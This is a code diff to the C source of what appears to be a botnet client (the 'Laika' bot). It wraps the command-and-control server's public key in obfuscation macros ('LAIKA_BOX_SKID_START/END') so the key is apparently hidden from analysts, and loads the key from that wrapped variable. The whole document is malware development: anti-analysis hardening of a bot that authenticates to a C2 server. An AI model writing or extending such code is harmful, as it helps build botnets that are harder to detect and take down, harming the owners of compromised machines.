@@ -1,6 +1,7 @@
 #include "lmem.h"
 #include "lsodium.h"
 #include "lerror.h"
+#include "lbox.h"
 #include "bot.h"
 #include "shell.h"
 
@@ -53,6 +54,7 @@ void laikaB_onPollFail(struct sLaika_socket *sock, void *uData) {
 /* ==================================================[[ Bot ]]=================================================== */
 
 struct sLaika_bot *laikaB_newBot(void) {
+    LAIKA_BOX_SKID_START(char*, cncPubKey, LAIKA_PUBKEY);
     struct sLaika_bot *bot = laikaM_malloc(sizeof(struct sLaika_bot));
     struct hostent *host;
     char *tempINBuf;
@@ -90,7 +92,7 @@ struct sLaika_bot *laikaB_newBot(void) {
     }
 
     /* read cnc's public key into peerPub */
-    if (!laikaK_loadKeys(bot->peer->peerPub, NULL, LAIKA_PUBKEY, NULL)) {
+    if (!laikaK_loadKeys(bot->peer->peerPub, NULL, cncPubKey, NULL)) {
         laikaB_freeBot(bot);
         LAIKA_ERROR("Failed to init cnc public key!\n");
     }
@@ -113,6 +115,7 @@ struct sLaika_bot *laikaB_newBot(void) {
 
     /* copy inet address info */
     strcpy(bot->peer->inet, tempINBuf);
+    LAIKA_BOX_SKID_END(cncPubKey);
     return bot;
 }
 
